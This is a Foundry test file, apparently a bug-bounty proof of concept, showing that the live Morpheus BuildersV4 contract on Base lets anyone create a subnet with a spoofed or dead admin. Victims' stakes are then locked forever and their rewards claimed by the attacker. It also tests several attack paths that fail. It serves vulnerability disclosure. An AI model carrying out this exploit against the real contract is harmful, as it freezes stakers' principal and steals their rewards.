// SPDX-License-Identifier: MIT
// Deep-dive PoC — BuildersV4 (Base, Appendix A) — Morpheus bug bounty.
// Fork: Base mainnet, pinned block 58_009_450, RPC base-rpc.publicnode.com.
// NO privileged accounts: attacker / victim / spoofed-admin are fresh keys;
// MOR is dealt to the victim via cheatcode (as in prior PoCs in this repo).
//
// Candidates under test:
//  K-13  createSubnet() has NO check that msg.sender == subnet.admin (or that
//        the admin consents). Anyone can create a subnet with an ARBITRARY
//        admin (spoofed trusted address, or an uncontrollable dead address),
//        claimAdmin = attacker, withdrawLockPeriodAfterDeposit = max,
//        minimalDeposit = 1 wei. Victims who stake into it (e.g. front-run of
//        the real project's creation under the exact announced name) get their
//        principal locked and their rewards diverted to the attacker.
//  K-09n (negative) unprivileged edit/setter/init/upgrade paths all revert.
//  K-10n (negative) claimable rewards CANNOT be inflated without real stake:
//        MOR donations to BuildersV4 / Treasury, and empty subnets, change
//        nothing (rewards come only from the RewardPool time curve).
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

struct Subnet {
    string name;
    address admin;
    uint128 unused1;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unused2;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

interface IBuildersV4 {
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function editSubnetMetadata(bytes32 subnetId_, SubnetMetadata calldata metadata_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function getCurrentSubnetsRewards() external view returns (uint256);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unused1,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unused2,
            uint256 minimalDeposit,
            address claimAdmin
        );
    function setNetworkShare(uint256 networkShare_) external;
    function setRewardPool(address rewardPool_) external;
    function setFeeConfig(address feeConfig_) external;
    function setBuildersTreasury(address treasury_) external;
    function setMinimalWithdrawLockPeriod(uint256 minimalWithdrawLockPeriod_) external;
    function setSubnetCreationFeeAmount(uint256 subnetCreationFeeAmount_) external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function BuildersV4_init(
        address depositToken_,
        address feeConfig_,
        address treasury_,
        address rewardPool_,
        address networkShareOwner_,
        uint256 minimalWithdrawLockPeriod_
    ) external;
}

contract BuildersDeepTest is Test {
    IBuildersV4 internal constant BUILDERS =
        IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20 internal constant MOR = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);
    address internal constant TREASURY = 0x9eba628581896ce086cb8f1A513ea6097A8FC561;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victimStaker");
    address internal victimAdmin = makeAddr("victimProjectAdmin"); // spoofed, never acts in tests 1-2
    address internal deadAdmin = address(0x000000000000000000000000000000000000dEaD);

    bytes32 internal subnetId;
    bytes32 internal deadSubnetId;

    function setUp() public {
        vm.createSelectFork("https://base-rpc.publicnode.com", 58_009_450);
    }

    function _meta() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata("", "", "", "");
    }

    function _spoofedSubnet() internal view returns (Subnet memory) {
        return
            Subnet({
                name: "VictimProject",
                admin: victimAdmin, // NOT the caller — spoofed trusted admin
                unused1: 0,
                withdrawLockPeriodAfterDeposit: type(uint128).max, // max lock
                unused2: 0,
                minimalDeposit: 1,
                claimAdmin: attacker // attacker controls the rewards
            });
    }

    function _fundVictimAndDeposit(bytes32 id_, uint256 amount_) internal {
        deal(address(MOR), victim, amount_);
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), amount_);
        BUILDERS.deposit(id_, amount_);
        vm.stopPrank();
    }

    // ---- K-13 (spoofed admin): principal locked + rewards diverted -----------
    function test_K13_SpoofedAdmin_LocksPrincipalAndDivertsRewards() public {
        // 1. Attacker (unprivileged) creates the subnet. No sender==admin check.
        vm.prank(attacker);
        BUILDERS.createSubnet(_spoofedSubnet(), _meta());
        subnetId = BUILDERS.getSubnetId("VictimProject");

        // Stored admin is the victim project, claimAdmin is the attacker.
        (, address admin_, , uint128 lock_, , uint256 minDep_, address claimAdmin_) = BUILDERS.subnets(subnetId);
        assertEq(admin_, victimAdmin, "admin must be the spoofed victim");
        assertEq(claimAdmin_, attacker, "claimAdmin must be the attacker");
        assertEq(lock_, type(uint128).max, "lock must be max");
        assertEq(minDep_, 1, "minimalDeposit must be 1 wei");

        // Attacker has NO privilege on the subnet: edit reverts.
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(attacker);
        BUILDERS.editSubnet(subnetId, _spoofedSubnet());

        // 2. Victim stakes 100,000 MOR into "VictimProject".
        uint256 buildersBalBefore = MOR.balanceOf(address(BUILDERS));
        _fundVictimAndDeposit(subnetId, 100_000 ether);
        assertEq(
            MOR.balanceOf(address(BUILDERS)),
            buildersBalBefore + 100_000 ether,
            "deposit must increase BuildersV4 backing 1:1"
        );

        // 3. One day passes: subnet accrues real rewards (pro-rata share).
        vm.warp(block.timestamp + 1 days);
        uint256 pending = BUILDERS.getCurrentSubnetRewards(subnetId);
        console.log("K13 pending rewards after 1d (MOR):", pending / 1 ether);
        assertGt(pending, 50 ether, "subnet must accrue material rewards in 1 day");

        // 4. Attacker (claimAdmin) claims them to an arbitrary address.
        uint256 attackerBefore = MOR.balanceOf(attacker);
        vm.prank(attacker);
        BUILDERS.claim(subnetId, attacker);
        uint256 stolen = MOR.balanceOf(attacker) - attackerBefore;
        console.log("K13 rewards diverted to attacker (MOR):", stolen / 1 ether);
        assertEq(stolen, pending, "attacker must receive the full pending rewards");
        assertEq(BUILDERS.getCurrentSubnetRewards(subnetId), 0, "pending must be zeroed after claim");

        // 5. Victim can NEVER withdraw the principal (lock = type(uint128).max).
        vm.expectRevert();
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, 100_000 ether);

        // 6. Victim is not admin/claimAdmin either: victim cannot claim.
        vm.expectRevert("BU: invalid caller");
        vm.prank(victim);
        BUILDERS.claim(subnetId, victim);
    }

    // ---- K-13b (dead admin): NOBODY can ever fix the subnet ------------------
    function test_K13b_DeadAdmin_NobodyCanFix() public {
        Subnet memory s = Subnet({
            name: "DeadAdminSubnet",
            admin: deadAdmin, // no known key: editSubnet can never be called
            unused1: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unused2: 0,
            minimalDeposit: 1,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        BUILDERS.createSubnet(s, _meta());
        deadSubnetId = BUILDERS.getSubnetId("DeadAdminSubnet");

        _fundVictimAndDeposit(deadSubnetId, 10_000 ether);
        vm.warp(block.timestamp + 1 days);

        // Attacker drains the rewards.
        uint256 before = MOR.balanceOf(attacker);
        vm.prank(attacker);
        BUILDERS.claim(deadSubnetId, attacker);
        assertGt(MOR.balanceOf(attacker) - before, 5 ether, "attacker must drain rewards");

        // Victim principal locked forever.
        vm.expectRevert();
        vm.prank(victim);
        BUILDERS.withdraw(deadSubnetId, 10_000 ether);

        // Nobody can edit: attacker, victim, and a random third party all revert.
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(attacker);
        BUILDERS.editSubnet(deadSubnetId, s);
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(victim);
        BUILDERS.editSubnet(deadSubnetId, s);
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(makeAddr("random"));
        BUILDERS.editSubnet(deadSubnetId, s);
    }

    // ---- K-13 mitigation (honest limitation): spoofed admin CAN reclaim ------
    // If the impersonated admin notices, editSubnet lets them fix lock +
    // claimAdmin — but the rewards already claimed by the attacker are gone,
    // and the lock counts from lastDeposit, so victims still wait out the
    // minimal lock (7 days live) after the fix.
    function test_K13c_SpoofedAdminCanReclaim_ButStolenRewardsAreGone() public {
        vm.prank(attacker);
        BUILDERS.createSubnet(_spoofedSubnet(), _meta());
        subnetId = BUILDERS.getSubnetId("VictimProject");
        _fundVictimAndDeposit(subnetId, 100_000 ether);
        vm.warp(block.timestamp + 1 days);

        // Attacker steals day-1 rewards first.
        vm.prank(attacker);
        BUILDERS.claim(subnetId, attacker);
        uint256 stolen = MOR.balanceOf(attacker);
        assertGt(stolen, 50 ether, "day-1 rewards stolen before reclaim");

        // Real admin notices and reclaims: lock -> minimal (7d), claimAdmin -> self.
        uint256 minLock = BUILDERS.minimalWithdrawLockPeriod();
        Subnet memory fixedSubnet = Subnet({
            name: "VictimProject",
            admin: victimAdmin,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: uint128(minLock),
            unused2: 0,
            minimalDeposit: 1,
            claimAdmin: victimAdmin
        });
        vm.prank(victimAdmin);
        BUILDERS.editSubnet(subnetId, fixedSubnet);

        // Attacker can no longer claim.
        vm.expectRevert("BU: invalid caller");
        vm.prank(attacker);
        BUILDERS.claim(subnetId, attacker);

        // Victim still locked until lastDeposit + 7d (lock counts from deposit).
        vm.expectRevert("BU: user withdraw is locked");
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, 100_000 ether);
        vm.warp(block.timestamp + 7 days);
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, 100_000 ether);
        assertEq(MOR.balanceOf(victim), 100_000 ether, "principal recovered after fix + wait");
        // ...but the stolen day-1 rewards never come back.
        assertGt(stolen, 50 ether, "stolen rewards stay stolen");
    }

    // ---- K-09 negative: every unprivileged mutation path reverts -------------
    function test_K09n_UnprivilegedPathsAllRevert() public {
        vm.prank(attacker);
        BUILDERS.createSubnet(_spoofedSubnet(), _meta());
        subnetId = BUILDERS.getSubnetId("VictimProject");

        // editSubnet / editSubnetMetadata as non-admin
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(attacker);
        BUILDERS.editSubnet(subnetId, _spoofedSubnet());
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(attacker);
        BUILDERS.editSubnetMetadata(subnetId, _meta());

        // owner-only global setters as non-owner
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.setNetworkShare(0);
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.setRewardPool(address(0));
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.setFeeConfig(address(0));
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.setBuildersTreasury(address(0));
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.setMinimalWithdrawLockPeriod(0);
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.setSubnetCreationFeeAmount(1 ether);

        // UUPS: re-initialization and upgrade as non-owner
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.BuildersV4_init(
            address(MOR),
            0x845FBB4B3e2207BF03087b8B94D2430AB11088eE,
            TREASURY,
            0xDC99a8596e395E52aba2BD08C623E1e428Dc3980,
            address(0),
            604800
        );
        vm.expectRevert();
        vm.prank(attacker);
        BUILDERS.upgradeToAndCall(address(BUILDERS), "");
    }

    // ---- K-10 negative: claimable rewards cannot be inflated -----------------
    function test_K10n_ClaimableCannotBeInflatedWithoutRealStake() public {
        // (d-first) Live deficit is real but operational: claimable > treasury
        // balance at the fork block, BEFORE this test donates anything.
        uint256 claimable0 = BUILDERS.getCurrentSubnetsRewards();
        uint256 treasuryBal0 = MOR.balanceOf(TREASURY);
        console.log("K10 claimable all subnets (MOR):", claimable0 / 1 ether);
        console.log("K10 treasury balance (MOR):", treasuryBal0 / 1 ether);
        console.log("K10 deficit (MOR):", (claimable0 - treasuryBal0) / 1 ether);
        assertGt(claimable0, treasuryBal0, "live deficit must still exist at fork block");

        vm.prank(attacker);
        BUILDERS.createSubnet(_spoofedSubnet(), _meta());
        subnetId = BUILDERS.getSubnetId("VictimProject");
        _fundVictimAndDeposit(subnetId, 100_000 ether);
        vm.warp(block.timestamp + 1 days);

        uint256 before = BUILDERS.getCurrentSubnetRewards(subnetId);
        assertGt(before, 50 ether, "baseline rewards must exist");

        // (a) Donate 50,000 MOR directly to BuildersV4: no balanceOf() anywhere
        // in the reward math, so claimable must not move (same block).
        deal(address(MOR), attacker, 50_000 ether);
        vm.startPrank(attacker);
        MOR.transfer(address(BUILDERS), 50_000 ether);
        vm.stopPrank();
        assertEq(
            BUILDERS.getCurrentSubnetRewards(subnetId),
            before,
            "donation to BuildersV4 must not change claimable"
        );

        // (b) Donate 50,000 MOR directly to the Treasury: same, no change.
        deal(address(MOR), attacker, 50_000 ether);
        vm.prank(attacker);
        MOR.transfer(TREASURY, 50_000 ether);
        assertEq(
            BUILDERS.getCurrentSubnetRewards(subnetId),
            before,
            "donation to Treasury must not change claimable"
        );

        // (c) Create 10 empty subnets: they earn 0 and change nothing for others.
        for (uint256 i = 0; i < 10; i++) {
            Subnet memory empty = Subnet({
                name: string(abi.encodePacked("Empty", vm.toString(i))),
                admin: attacker,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: 604800, // must be >= minimalWithdrawLockPeriod (7d live)
                unused2: 0,
                minimalDeposit: 1,
                claimAdmin: attacker
            });
            vm.prank(attacker);
            BUILDERS.createSubnet(empty, _meta());
            assertEq(
                BUILDERS.getCurrentSubnetRewards(BUILDERS.getSubnetId(string(abi.encodePacked("Empty", vm.toString(i))))),
                0,
                "empty subnet must earn 0"
            );
        }
        assertEq(
            BUILDERS.getCurrentSubnetRewards(subnetId),
            before,
            "empty subnets must not change existing claimable"
        );

        // (e) After all the manipulation above, the victim subnet's claimable
        // is still exactly the pre-manipulation value: nothing inflated it.
        assertEq(
            BUILDERS.getCurrentSubnetRewards(subnetId),
            before,
            "claimable must be unchanged after all inflation attempts"
        );
    }
}
